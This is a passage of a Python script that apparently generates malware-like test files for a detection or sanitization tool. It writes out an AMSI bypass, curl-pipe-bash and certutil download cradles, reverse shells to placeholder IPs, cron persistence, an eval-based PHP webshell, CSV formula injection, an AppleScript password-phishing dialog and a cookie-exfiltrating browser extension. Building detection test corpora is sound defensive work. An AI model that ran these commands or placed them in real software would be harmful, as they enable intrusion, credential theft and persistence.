    struct.pack_into("<III", rdata, 0x28, 0x1000, 0x1000, 0x1000)
    struct.pack_into("<III", rdata, 0x34, 0x2060, 0x2070, 0x2080)
    struct.pack_into("<HHH", rdata, 0x40, 0, 1, 2)
    pe_name = b"ultimate_detectio.exe\x00"
    rdata[0x48:0x48+len(pe_name)] = pe_name
    exp1 = b"DropPayload\x00"
    exp2 = b"InitPayload\x00"
    exp3 = b"ServiceMain\x00"
    rdata[0x60:0x60+len(exp1)] = exp1
    rdata[0x70:0x70+len(exp2)] = exp2
    rdata[0x80:0x80+len(exp3)] = exp3

    # IMPORTS at 0x2100 (offset 0x100 in rdata)
    # Descriptor: OriginalFirstThunk = 0x2130, Name = 0x2180 ("KERNEL32.dll"), FirstThunk = 0x2150
    struct.pack_into("<IIIII", rdata, 0x100, 0x2130, 0, 0, 0x2180, 0x2150)
    # INT (OriginalFirstThunk) at 0x130 (5 functions + null terminator)
    struct.pack_into("<IIIIII", rdata, 0x130, 0x21A0, 0x21B0, 0x21D0, 0x21F0, 0x2210, 0)
    # IAT (FirstThunk) at 0x150
    struct.pack_into("<IIIIII", rdata, 0x150, 0x21A0, 0x21B0, 0x21D0, 0x21F0, 0x2210, 0)
    k32 = b"KERNEL32.dll\x00"
    rdata[0x180:0x180+len(k32)] = k32
    
    funcs = [b"VirtualAlloc\x00", b"CreateRemoteThread\x00", b"WriteProcessMemory\x00", b"IsDebuggerPresent\x00", b"WinExec\x00"]
    offsets = [0x1A0, 0x1B0, 0x1D0, 0x1F0, 0x210]
    for idx, (fn, off) in enumerate(zip(funcs, offsets), 1):
        struct.pack_into("<H", rdata, off, idx)
        rdata[off+2:off+2+len(fn)] = fn
    
    # .data section with suspicious strings & C2 URLs
    data_bytes = bytearray(0x200)
    c2_str = b"https://threat-c2-botnet.org/api/heartbeat\x00cmd.exe /c calc.exe\x00beacon.xyz\x00"
    data_bytes[0:len(c2_str)] = c2_str
    
    # .packed section with high Shannon entropy (>7.5)
    packed_bytes = bytearray(os.urandom(0x200))
    
    # Certificate table entry at offset 0xE00
    cert_entry = struct.pack("<IH", 256, 0x0002) + b"PKCS#7 Untrusted Fake Signature Certificate Authority" + b"\x00" * 198
    
    # 1. Embedded Valid .ico Icon Data
    ico_header = b"\x00\x00\x01\x00\x01\x00"  # ICO magic + 1 image
    ico_entry = struct.pack("<BBBBHHII", 16, 16, 0, 0, 1, 32, 128, 22)
    ico_bitmap = b"\x28\x00\x00\x00\x10\x00\x00\x00\x20\x00\x00\x00\x01\x00\x20\x00\x00\x00\x00\x00" + b"\x00" * 108
    ico_bytes = ico_header + ico_entry + ico_bitmap

    # 2. Embedded Valid .zip Archive Data
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("embedded_secret_config.ini", "[C2]\nhost=198.51.100.1\nbeacon_rate=30\n")
        zf.writestr("credential_dump.txt", "admin:$2a$12$e8Y5WJkXfakeHashValueForTesting\n")
    zip_bytes = zip_buf.getvalue()

    # 3. Embedded Valid .docx Document Data
    docx_buf = io.BytesIO()
    with zipfile.ZipFile(docx_buf, "w", compression=zipfile.ZIP_DEFLATED) as dzf:
        dzf.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>')
        dzf.writestr("word/document.xml", '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Confidential Embedded Strategy</w:t></w:r></w:p></w:body></w:document>')
    docx_bytes = docx_buf.getvalue()

    # 4. Embedded Valid .pdf Document Data
    pdf_bytes = (
        b"%PDF-1.7\n1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n"
        b"2 0 obj\n<</Type /Pages /Kids [3 0 R] /Count 1>>\nendobj\n"
        b"3 0 obj\n<</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]>>\nendobj\n"
        b"xref\n0 4\n0000000000 65535 f\n0000000010 00000 n\n0000000060 00000 n\n0000000115 00000 n\n"
        b"trailer\n<</Size 4 /Root 1 0 R>>\nstartxref\n185\n%%EOF\n"
    )

    # 5. High-Entropy Overlay Section (Appended Data past declared PE boundaries)
    overlay_payload = (
        b"--- BEGIN APT EMBEDDED OVERLAY PAYLOAD ---\n"
        b"BeaconHost: https://threat-c2-hidden-overlay.org/v2/pulse\n"
        b"PayloadCommand: cmd.exe /c start /b powershell.exe -w hidden -enc V3JpdGUtSG9zdA==\n"
        + bytearray(os.urandom(512)) +
        b"\n--- END APT EMBEDDED OVERLAY PAYLOAD ---\n"
    )

    # Combine all parts into executable with rich embedded artifacts
    binary_bytes = raw_headers + text_data + rdata + data_bytes + packed_bytes + cert_entry + ico_bytes + zip_bytes + docx_bytes + pdf_bytes + overlay_payload
    out_path = OUT_DIR / "ultimate_detectio.exe"
    out_path.write_bytes(binary_bytes)
    print(f"[*] Generated: {out_path.name} ({len(binary_bytes)} bytes) with real PE Imports/Exports, embedded ICO, ZIP, DOCX, PDF, and high-entropy overlay")

def generate_jar():
    """ultimate_detectio.jar: Standalone Java Archive with manifest Main-Class, all-permissions, ProcessBuilder/Runtime.exec, and embedded payload."""
    jar_buf = io.BytesIO()
    with zipfile.ZipFile(jar_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        manifest_data = (
            "Manifest-Version: 1.0\r\n"
            "Main-Class: com.security.poc.MaliciousDropper\r\n"
            "Permissions: all-permissions\r\n"
            "Application-Name: CyberSecurity Threat Simulation Dropper\r\n"
            "Codebase: *\r\n"
            "Created-By: 17.0.2 (Oracle Corporation)\r\n"
            "\r\n"
        )
        zf.writestr("META-INF/MANIFEST.MF", manifest_data)
        
        # Mock compiled Java bytecode class with suspicious API signatures
        mock_bytecode = (
            b"\xCA\xFE\xBA\xBE"  # Java class magic bytes
            b"\x00\x00\x00\x37"  # Java version 55 (Java 11)
            b"\x00\x2A"          # Constant pool count
            b"\x01\x00\x25com/security/poc/MaliciousDropper\x00"
            b"\x01\x00\x10java/lang/Object\x00"
            b"\x01\x00\x18java/lang/ProcessBuilder\x00"
            b"\x01\x00\x11java/lang/Runtime\x00"
            b"\x01\x00\x04exec\x00"
            b"\x01\x00\x17java/net/URLClassLoader\x00"
            b"\x01\x00\x10sun/misc/Unsafe\x00"
            b"\x01\x00\x0Ejava/net/Socket\x00"
            b"\x01\x00(https://threat-c2-java.org/stage2.bin\x00"
            b"\x01\x00&cmd.exe /c start /b powershell.exe\x00"
            + b"\x00" * 256
        )
        zf.writestr("com/security/poc/MaliciousDropper.class", mock_bytecode)
        zf.writestr("com/security/poc/PayloadHelper.class", mock_bytecode)
        
        # Embedded configuration
        zf.writestr("config/app_secrets.properties", "c2.server=https://threat-c2-java.org/api\nencryption.key=HardcodedMasterKey2026!\n")
        
        # Embedded executable payload
        zf.writestr("bin/native_loader.exe", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF" + b"\x00" * 128)

    jar_bytes = jar_buf.getvalue()
    out_path = OUT_DIR / "ultimate_detectio.jar"
    out_path.write_bytes(jar_bytes)
    print(f"[*] Generated: {out_path.name} ({len(jar_bytes)} bytes) with Main-Class, all-permissions, ProcessBuilder, and embedded native binary")

def generate_elf():
    """ultimate_detectio.elf: Linux 64-bit ELF with sections, dynamic symbols, ptrace anti-debugging, and rodata strings."""
    shstrtab = b'\x00.text\x00.rodata\x00.dynamic\x00.dynstr\x00.dynsym\x00.shstrtab\x00'
    dynstr = b'\x00libc.so.6\x00libpthread.so.0\x00ptrace\x00mprotect\x00socket\x00connect\x00execve\x00'

    rodata = (
        b'/proc/self/status\x00'
        b'TracerPid:\x00'
        b'http://c2.evil-attacker.org/beacon\x00'
        b'/bin/bash\x00'
        b'cat /etc/shadow\x00'
        b'192.168.1.100\x00'
    )

    code = (
        b'\x48\x31\xff'          # xor rdi, rdi
        b'\xb8\x65\x00\x00\x00'  # mov eax, 101 (sys_ptrace)
        b'\x0f\x05'              # syscall
        b'\x0f\x31'              # rdtsc
        b'\x48\x31\xc0'          # xor rax, rax
        b'\xb8\x3c\x00\x00\x00'  # mov eax, 60 (sys_exit)
        b'\x0f\x05'              # syscall
    )

    dynsym = (
        b'\x00' * 24 +
        struct.pack('<IBBHQQ', dynstr.index(b'ptrace'), 0x12, 0, 1, 0x400200, 16) +
        struct.pack('<IBBHQQ', dynstr.index(b'mprotect'), 0x12, 0, 1, 0x400210, 16) +
        struct.pack('<IBBHQQ', dynstr.index(b'socket'), 0x12, 0, 1, 0x400220, 16) +
        struct.pack('<IBBHQQ', dynstr.index(b'connect'), 0x12, 0, 1, 0x400230, 16) +
        struct.pack('<IBBHQQ', dynstr.index(b'execve'), 0x12, 0, 1, 0x400240, 16)
    )

    base_vaddr = 0x400000
    ehdr_sz = 64
    ph_cnt = 3
    ph_sz = 56
    ph_table_sz = ph_cnt * ph_sz

    text_off = ehdr_sz + ph_table_sz
    text_sz = len(code)
    text_vaddr = base_vaddr + text_off

    rodata_off = (text_off + text_sz + 7) & ~7
    rodata_sz = len(rodata)
    rodata_vaddr = base_vaddr + rodata_off

    dynstr_off = (rodata_off + rodata_sz + 7) & ~7
    dynstr_sz = len(dynstr)
    dynstr_vaddr = base_vaddr + dynstr_off

    dynsym_off = (dynstr_off + dynstr_sz + 7) & ~7
    dynsym_sz = len(dynsym)
    dynsym_vaddr = base_vaddr + dynsym_off

    dynamic_off = (dynsym_off + dynsym_sz + 7) & ~7
    dynamic_entries = [
        (1, dynstr.index(b'libc.so.6')),
        (1, dynstr.index(b'libpthread.so.0')),
        (5, dynstr_vaddr),
        (6, dynsym_vaddr),
        (10, dynstr_sz),
        (11, 24),
        (0, 0)
    ]
    dynamic_bytes = b''.join(struct.pack('<QQ', tag, val) for tag, val in dynamic_entries)
    dynamic_sz = len(dynamic_bytes)
    dynamic_vaddr = base_vaddr + dynamic_off

    shstrtab_off = (dynamic_off + dynamic_sz + 7) & ~7
    shstrtab_sz = len(shstrtab)

    sh_off = (shstrtab_off + shstrtab_sz + 7) & ~7

    ph_load = struct.pack('<IIQQQQQQ', 1, 5, 0, base_vaddr, base_vaddr, sh_off + 7 * 64, sh_off + 7 * 64, 0x1000)
    ph_dyn = struct.pack('<IIQQQQQQ', 2, 6, dynamic_off, dynamic_vaddr, dynamic_vaddr, dynamic_sz, dynamic_sz, 8)
    ph_stack = struct.pack('<IIQQQQQQ', 0x6474e551, 7, 0, 0, 0, 0, 0, 0x10)
    ph_table = ph_load + ph_dyn + ph_stack

    e_ident = b'\x7fELF\x02\x01\x01\x00' + b'\x00' * 8
    elf_hdr = e_ident + struct.pack('<HHIQQQIHHHHHH',
        2, 62, 1, text_vaddr, ehdr_sz, sh_off, 0, ehdr_sz, ph_sz, ph_cnt, 64, 7, 6
    )

    sh_null = b'\x00' * 64
    sh_text = struct.pack('<IIQQQQIIQQ', shstrtab.index(b'.text'), 1, 6, text_vaddr, text_off, text_sz, 0, 0, 16, 0)
    sh_rodata = struct.pack('<IIQQQQIIQQ', shstrtab.index(b'.rodata'), 1, 2, rodata_vaddr, rodata_off, rodata_sz, 0, 0, 8, 0)
    sh_dynamic = struct.pack('<IIQQQQIIQQ', shstrtab.index(b'.dynamic'), 6, 3, dynamic_vaddr, dynamic_off, dynamic_sz, 4, 0, 8, 16)
    sh_dynstr = struct.pack('<IIQQQQIIQQ', shstrtab.index(b'.dynstr'), 3, 2, dynstr_vaddr, dynstr_off, dynstr_sz, 0, 0, 1, 0)
    sh_dynsym = struct.pack('<IIQQQQIIQQ', shstrtab.index(b'.dynsym'), 11, 2, dynsym_vaddr, dynsym_off, dynsym_sz, 4, 1, 8, 24)
    sh_shstrtab = struct.pack('<IIQQQQIIQQ', shstrtab.index(b'.shstrtab'), 3, 0, 0, shstrtab_off, shstrtab_sz, 0, 0, 1, 0)
    sh_table = sh_null + sh_text + sh_rodata + sh_dynamic + sh_dynstr + sh_dynsym + sh_shstrtab

    buf = bytearray(sh_off + len(sh_table))
    buf[0:ehdr_sz] = elf_hdr
    buf[ehdr_sz:ehdr_sz+len(ph_table)] = ph_table
    buf[text_off:text_off+text_sz] = code
    buf[rodata_off:rodata_off+rodata_sz] = rodata
    buf[dynstr_off:dynstr_off+dynstr_sz] = dynstr
    buf[dynsym_off:dynsym_off+dynsym_sz] = dynsym
    buf[dynamic_off:dynamic_off+dynamic_sz] = dynamic_bytes
    buf[shstrtab_off:shstrtab_off+shstrtab_sz] = shstrtab
    buf[sh_off:sh_off+len(sh_table)] = sh_table

    elf_bytes = bytes(buf)
    for name in ["ultimate_detectio.elf", "ultimate_detection.elf"]:
        (OUT_DIR / name).write_bytes(elf_bytes)
        try:
            (Path("test-files") / name).write_bytes(elf_bytes)
        except Exception:
            pass
    print(f"[*] Generated: ultimate_detectio.elf and ultimate_detection.elf ({len(elf_bytes)} bytes)")


def generate_ps1():
    """ultimate_detectio.ps1: AMSI bypass, cradle, IEX, Base64 block, LOLBin, process injection."""
    content = (
        "# =====================================================================\n"
        "# Ultimate Detection PowerShell Stager & Recon Payload\n"
        "# =====================================================================\n\n"
        "# 1. AMSI Memory Patch Bypass\n"
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n"
        "# 2. WebClient Download Cradle\n"
        "$wc = New-Object System.Net.WebClient\n"
        "$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')\n"
        "$stage2 = $wc.DownloadString('https://threat-c2-infrastructure.net/stage2.ps1')\n\n"
        "# 3. Dynamic Execution Hook\n"
        "Invoke-Expression $stage2\n\n"
        "# 4. Memory Injection & Win32 API Allocation\n"
        "$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096)\n"
        "[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $bytes.Length)\n\n"
        "# 5. LOLBin Certutil and Stealth Execution\n"
        "certutil -urlcache -split -f https://threat-c2-infrastructure.net/implant.bin C:\\Temp\\implant.bin\n"
        "$encCmd = 'V3JpdGUtSG9zdCAiTWFsaWNpb3VzIHNjcmlwdCBsb2FkZWQgc3VjY2Vzc2Z1bGx5ISIK'\n"
        "powershell.exe -ep bypass -w hidden -enc $encCmd\n"
    )
    out_path = OUT_DIR / "ultimate_detectio.ps1"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_sh():
    """ultimate_detectio.sh: Reverse shell, curl | bash, cron persistence, base64 payload."""
    content = (
        "#!/usr/bin/env bash\n"
        "# =====================================================================\n"
        "# Ultimate Linux Threat Exploit & Persistence Script\n"
        "# =====================================================================\n\n"
        "# 1. Download & Dynamic Piping Execution\n"
        "curl -fsSL https://threat-c2.net/rootkit.sh | bash\n"
        "wget -qO- https://threat-c2.net/backdoor.sh | sh\n\n"
        "# 2. Reverse TCP Shell Hook\n"
        "bash -i >& /dev/tcp/198.51.100.44/4444 0>&1 &\n"
        "nc -e /bin/bash 198.51.100.44 5555 &\n\n"
        "# 3. Crontab Persistence Mechanism\n"
        "(crontab -l 2>/dev/null; echo \"* * * * * curl -s https://threat-c2.net/p.sh | bash\") | crontab -\n"
        "echo \"0 * * * * root /tmp/.hidden_backdoor\" >> /etc/cron.d/persistence\n\n"
        "# 4. Encoded In-Memory Payload\n"
        "echo \"Y2F0IC9ldGMvc2hhZG93\" | base64 -d | sh\n"
    )
    out_path = OUT_DIR / "ultimate_detectio.sh"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_vbs():
    """ultimate_detectio.vbs: WScript.Shell, HTTP download cradle, ExecuteGlobal."""
    content = (
        "' =====================================================================\n"
        "' Ultimate Detection VBScript Dropper & Stager\n"
        "' =====================================================================\n\n"
        "Dim wsh, http, fso, payloadUrl, tempPath\n"
        "Set wsh = CreateObject(\"WScript.Shell\")\n"
        "Set http = CreateObject(\"MSXML2.XMLHTTP\")\n"
        "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n\n"
        "payloadUrl = \"https://threat-c2-infrastructure.net/stage2.vbs\"\n"
        "http.Open \"GET\", payloadUrl, False\n"
        "http.Send\n\n"
        "If http.Status = 200 Then\n"
        "    ' Dynamic execution of downloaded payload\n"
        "    ExecuteGlobal http.responseText\n"
        "End If\n\n"
        "' Launch LOLBin with hidden console\n"
        "wsh.Run \"certutil.exe -urlcache -split -f http://threat-c2.net/implant.exe %TEMP%\\implant.exe\", 0, True\n"
        "wsh.Run \"powershell.exe -w hidden -c calc.exe\", 0, False\n"
    )
    out_path = OUT_DIR / "ultimate_detectio.vbs"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_php():
    """ultimate_detectio.php: Webshell signatures (c99, b374k), eval, system, passthru."""
    content = (
        "<?php\n"
        "/**\n"
        " * Ultimate Detection PHP Webshell Backdoor\n"
        " * Contains c99, r57, b374k, and wso webshell signature keywords\n"
        " */\n"
        "error_reporting(0);\n"
        "$auth_pass = 'c99shell_admin_access_token_2026';\n"
        "$shell_version = 'b374k 3.2.1 hardened edition';\n\n"
        "if (isset($_POST['cmd'])) {\n"
        "    $cmd = base64_decode($_POST['cmd']);\n"
        "    // Dynamic code execution\n"
        "    eval($cmd);\n"
        "}\n\n"
        "if (isset($_GET['exec'])) {\n"
        "    // System command execution\n"
        "    $out = system($_GET['exec']);\n"
        "    passthru($_GET['exec']);\n"
        "    echo shell_exec($_GET['exec']);\n"
        "}\n\n"
        "$payload = 'system(\"whoami; uname -a; id\");';\n"
        "assert($payload);\n"
        "?>"
    )
    out_path = OUT_DIR / "ultimate_detectio.php"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_bat():
    """ultimate_detectio.bat: certutil -urlcache, bitsadmin, powershell hidden launch."""
    content = (
        "@echo off\r\n"
        ":: =====================================================================\r\n"
        ":: Ultimate Detection Batch Dropper & C2 Loader\r\n"
        ":: =====================================================================\r\n\r\n"
        "echo [*] Initializing Windows Security Diagnostic Update...\r\n\r\n"
        ":: LOLBin Download Cradle via Certutil\r\n"
        "certutil -urlcache -split -f https://threat-c2-infrastructure.net/stage2.exe %TEMP%\\svchost_update.exe\r\n\r\n"
        ":: Background Transfer via Bitsadmin\r\n"
        "bitsadmin /transfer MaliciousJob /priority high https://threat-c2.net/payload.dll %TEMP%\\payload.dll\r\n\r\n"
        ":: Hidden PowerShell Execution\r\n"
        "powershell.exe -w hidden -nop -enc V3JpdGUtSG9zdCAiQmF0Y2ggcGVsYXkgZXhlY3V0ZWQgc3VjY2Vzc2Z1bGx5ISIK\r\n\r\n"
        ":: Launch Payload\r\n"
        "start \"\" \"%TEMP%\\svchost_update.exe\"\r\n"
    )
    out_path = OUT_DIR / "ultimate_detectio.bat"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_js():
    """ultimate_detectio.js: eval, atob, ActiveXObject WScript.Shell, script injection."""
    content = (
        "// =====================================================================\n"
        "// Ultimate Detection JavaScript Exploit & Stager\n"
        "// =====================================================================\n\n"
        "try {\n"
        "    // Windows Script Host Execution\n"
        "    var wsh = new ActiveXObject('WScript.Shell');\n"
        "    wsh.Run('powershell.exe -w hidden -enc V3JpdGUtSG9zdA==', 0, false);\n"
        "} catch (e) {}\n\n"
        "// Obfuscated dynamic evaluation\n"
        "var encoded = 'YWxlcnQoJ0phdmFTY3JpcHQgRXhwbG9pdCBFeGVjdXRlZCcp';\n"
        "eval(atob(encoded));\n\n"
        "// Dynamic DOM element injection\n"
        "if (typeof document !== 'undefined') {\n"
        "    var s = document.createElement('script');\n"
        "    s.src = 'https://threat-c2-infrastructure.net/hook.js';\n"
        "    document.head.appendChild(s);\n"
        "}\n"
    )
    out_path = OUT_DIR / "ultimate_detectio.js"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_csv():
    """ultimate_detectio.csv: CSV Formula Injection (DDE Execution attacks)."""
    content = (
        "Transaction ID,Account Holder,Amount (USD),Status,Verification Formula\n"
        "TX-1001,John Doe,1500.00,Verified,\"=cmd|'/c calc.exe'!A0\"\n"
        "TX-1002,Jane Smith,2450.50,Pending,\"+cmd|'/c powershell.exe -w hidden -c calc.exe'!A0\"\n"
        "TX-1003,Acme Corp,99000.00,Flagged,\"-cmd|'/c certutil -urlcache -split -f http://evil.com/x.exe'!A0\"\n"
        "TX-1004,Target User,500.00,Review,\"@SUM(1+1)*cmd|'/c calc'!A0\"\n"
    )
    out_path = OUT_DIR / "ultimate_detectio.csv"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_applescript():
    """ultimate_detectio.applescript: Plain text AppleScript with privilege escalation and dialog password harvesting."""
    content = (
        "-- =====================================================================\n"
        "-- Ultimate Detection AppleScript Forensic Test\n"
        "-- =====================================================================\n\n"
        "-- 1. Credential Harvesting Phishing Dialog (T1056.002)\n"
        'display dialog "macOS requires system administrator authorization to apply essential security updates." default answer "" with hidden answer buttons {"Cancel", "Authenticate"} default button "Authenticate" with icon caution\n'
        'set userPassword to text returned of result\n\n'
        "-- 2. Privilege Escalation with Root Execution (T1548.001)\n"
        'do shell script "curl -s -k https://threat-c2-infrastructure.net/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh" with administrator privileges\n\n'
        "-- 3. Synthetic Keystroke Injection via System Events (T1056.001)\n"
        'tell application "System Events"\n'
        '    keystroke userPassword\n'
        '    key code 36\n'
        'end tell\n\n'
        "-- 4. Terminal Command Execution Bridge\n"
        'tell application "Terminal"\n'
        '    do script "echo \'AppleScript execution active\' && nc -e /bin/sh 198.51.100.1 4444"\n'
        'end tell\n'
    )
    out_path = OUT_DIR / "ultimate_detectio.applescript"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_scpt():
    """ultimate_detectio.scpt: Compiled Open Scripting Architecture (OSA) bytecode."""
    osas_header = b"Osas\x00\x02\x00\x00\x00\x00\x00\x00"
    script_strings = (
        b"do shell script\x00with administrator privileges\x00"
        b"display dialog\x00with hidden answer\x00"
        b"System Events\x00keystroke\x00"
        b"https://threat-c2-infrastructure.net/implant.bin\x00"
        b"curl -o /tmp/implant && chmod +x /tmp/implant\x00"
    )
    padding = b"\x00" * (512 - len(osas_header) - len(script_strings))
    scpt_bytes = osas_header + script_strings + padding
    out_path = OUT_DIR / "ultimate_detectio.scpt"
    out_path.write_bytes(scpt_bytes)
    print(f"[*] Generated: {out_path.name} ({len(scpt_bytes)} bytes)")

def generate_crx():
    """ultimate_detectio.crx: Chrome Extension CRX3 package testing critical permissions, content scripts, and CSP."""
    import json
    manifest_dict = {
        "manifest_version": 3,
        "name": "Ultimate Security Triage Extension",
        "version": "1.0.0",
        "description": "CRX testing critical permissions, content script injection, and CSP risks.",
        "permissions": [
            "debugger", "webRequest", "cookies", "storage",
            "clipboardRead", "tabs", "nativeMessaging"
        ],
        "host_permissions": ["<all_urls>", "*://*/*"],
        "background": {
            "service_worker": "background.js"
        },
        "content_scripts": [
            {
                "matches": ["<all_urls>"],
                "js": ["content.js"],
                "run_at": "document_start"
            }
        ],
        "content_security_policy": {
            "extension_pages": "script-src 'self' 'unsafe-eval' https://threat-c2-cdn.net; object-src 'self'"
        }
    }
    manifest_bytes = json.dumps(manifest_dict, indent=2).encode("utf-8")

    bg_js = (
        "// Background telemetry and cookie exfiltration\n"
        "chrome.cookies.getAll({}, function(cookies) {\n"
        "    navigator.sendBeacon('https://threat-c2-infrastructure.net/collector', JSON.stringify(cookies));\n"
        "});\n"
        "eval('console.log(\"Dynamic evaluation inside background service worker\")');\n"
    ).encode("utf-8")

    content_js = (
        "// Password field monitoring & keylogging\n"
        "document.addEventListener('keydown', function(e) {\n"
        "    var passFields = document.querySelectorAll('input[type=\"password\"]');\n"
        "    console.log('Monitored password field input: ' + e.key);\n"
        "});\n"
    ).encode("utf-8")

    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", manifest_bytes)
        zf.writestr("background.js", bg_js)
        zf.writestr("content.js", content_js)
    zip_bytes = zip_buf.getvalue()

    header_data = b"\x12\x08test-pub\x1a\x08test-sig"
    crx3_header = b"Cr24" + struct.pack("<II", 3, len(header_data)) + header_data
    crx_bytes = crx3_header + zip_bytes

    out_path = OUT_DIR / "ultimate_detectio.crx"
    out_path.write_bytes(crx_bytes)
    print(f"[*] Generated: {out_path.name} ({len(crx_bytes)} bytes)")

def generate_ai_image():
    """ultimate_detectio_ai.png & jpg: Synthetic AI images with C2PA and Stable Diffusion / Midjourney prompt metadata."""
    from PIL import Image, PngImagePlugin

    img = Image.new("RGB", (512, 512), color=(30, 40, 60))
    for x in range(512):
        for y in range(512):
            img.putpixel((x, y), ((x // 2) % 256, (y // 2) % 256, ((x + y) // 4) % 256))

    # 1. PNG with Stable Diffusion parameters and C2PA markers
    png_info = PngImagePlugin.PngInfo()
    sd_params = (
        "cyberpunk neon forensic terminal, glowing holographic wireframe, 8k resolution, photorealistic\n"
        "Negative prompt: low quality, blurry, watermark, artifacts, distorted\n"
        "Steps: 35, Sampler: DPM++ 2M Karras, CFG scale: 7.5, Seed: 987654321, Size: 512x512, "
        "Model hash: 7e2b834fa1, Model: stable-diffusion-xl-base-1.0"
    )
    png_info.add_text("parameters", sd_params)
    png_info.add_text("c2pa_provenance", "http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia; claim_generator: OpenAI DALL-E 3")

    png_buf = io.BytesIO()
    img.save(png_buf, format="PNG", pnginfo=png_info)
    png_bytes = png_buf.getvalue()

    c2pa_jumbf = (
        b"--- C2PA MANIFEST STORE ---\n"
        b"box_type: jumb\n"
        b"content_type: c2pa\n"
        b'claim_generator: "OpenAI DALL-E 3"\n'
        b"digitalSourceType: http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia\n"
        b"actions: [c2pa.created]\n"
    )
    png_bytes += c2pa_jumbf

    png_path = OUT_DIR / "ultimate_detectio_ai.png"
    png_path.write_bytes(png_bytes)
    print(f"[*] Generated: {png_path.name} ({len(png_bytes)} bytes)")

    # 2. JPG with EXIF UserComment containing Midjourney prompt & C2PA marker
    jpg_buf = io.BytesIO()
    img.save(jpg_buf, format="JPEG", quality=90)
    jpg_bytes = jpg_buf.getvalue() + c2pa_jumbf + b"Midjourney v6 prompt: /imagine futuristic cybersecurity forensic operations center --v 6.0 --ar 16:9 --stylize 250\n"

    jpg_path = OUT_DIR / "ultimate_detectio_ai.jpg"
    jpg_path.write_bytes(jpg_bytes)
    print(f"[*] Generated: {jpg_path.name} ({len(jpg_bytes)} bytes)")

def generate_apple_app():
    """ultimate_detectio.app.zip: macOS Application bundle with Info.plist permissions and universal binary."""
    fat_magic = b"\xCA\xFE\xBA\xBE"
    macho_slices = fat_magic + struct.pack(">I", 2) + b"\x00" * 248

    info_plist_xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
        '<plist version="1.0">\n'
        '<dict>\n'
        '    <key>CFBundleIdentifier</key>\n'
        '    <string>com.filesanitizer.ultimatedetectio</string>\n'
        '    <key>CFBundleName</key>\n'
        '    <string>UltimateDetectio</string>\n'
        '    <key>CFBundleExecutable</key>\n'
        '    <string>UltimateDetectioBinary</string>\n'
        '    <key>CFBundleVersion</key>\n'
        '    <string>1.0.0</string>\n'
        '    <key>LSUIElement</key>\n'
        '    <true/>\n'
        '    <key>NSCameraUsageDescription</key>\n'
        '    <string>Requires camera access for surveillance</string>\n'
        '    <key>NSMicrophoneUsageDescription</key>\n'
        '    <string>Requires microphone access for audio monitoring</string>\n'
        '    <key>NSAppleEventsUsageDescription</key>\n'
        '    <string>Requires permission to control other macOS applications</string>\n'
        '</dict>\n'
        '</plist>\n'
    ).encode("utf-8")

    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("UltimateDetectio.app/Contents/Info.plist", info_plist_xml)
        zf.writestr("UltimateDetectio.app/Contents/MacOS/UltimateDetectioBinary", macho_slices)
        zf.writestr("UltimateDetectio.app/Contents/Resources/app_icon.icns", b"\x00" * 64)

    out_path = OUT_DIR / "ultimate_detectio.app.zip"
    out_path.write_bytes(zip_buf.getvalue())
    print(f"[*] Generated: {out_path.name} ({len(zip_buf.getvalue())} bytes)")

def create_aliases():
    """Also create ultimate_detection.<ext> for each file as a convenience alias."""
    for f in list(OUT_DIR.glob("ultimate_detectio.*")):
        ext = f.suffix
        det_name = OUT_DIR / f"ultimate_detection{ext}"
        if not det_name.exists():
            shutil.copyfile(f, det_name)

def main():
    print(f"[*] Generating all ultimate detection test files into {OUT_DIR}...")
    generate_pdf()
    generate_office_docm()
    generate_office_docx()
    generate_office_xlsx()
    generate_rtf()
    generate_jpg()
    generate_png()
    generate_svg()
    generate_html()
    generate_zip()
    generate_eml()
    generate_msg()
    generate_exe()
    generate_elf()
    generate_ps1()
    generate_sh()
    generate_vbs()
    generate_php()
    generate_bat()
    generate_js()
    generate_csv()
    generate_applescript()
    generate_scpt()
    generate_crx()
